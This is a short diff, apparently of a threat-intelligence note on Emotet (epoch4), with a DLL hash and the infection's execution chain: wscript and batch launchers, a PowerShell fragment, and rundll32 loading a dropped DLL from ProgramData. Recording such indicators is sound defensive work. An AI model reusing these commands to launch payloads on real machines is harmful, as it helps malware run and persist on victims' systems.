@@ -4,10 +4,11 @@ Emotet 2022 - 07.02.2022 - epoch4
 
 .dll 937dc9c1d35085a37333f1af629af0c884480e8fea555682f831160d8e968486
 
-** Exec ** 
+** Exec **
+
 wscript c:\programdata\yhjlswle.vbs
 
-cmd.exe /c ""C:\programdata\ughldskbhn.bat"
+cmd.exe /c C:\programdata\ughldskbhn.bat
 
 .ps1 
 
@@ -24,7 +25,7 @@ foreach ($yidsrhye34syufgxjcdf in $mjxdfshdrfgzses4) {
 
 cmd.exe /c start /B c:\windows\syswow64\rundll32.exe c:\programdata\bneuihlows.dll,hjyldksfkw3
 
-rundll32.exe  c:\programdata\bneuihlows.dll,hjyldksfkw3
+rundll32.exe c:\programdata\bneuihlows.dll,hjyldksfkw3
 
 rundll32.exe c:\programdata\bneuihlows.dll",DllRegisterServer
 
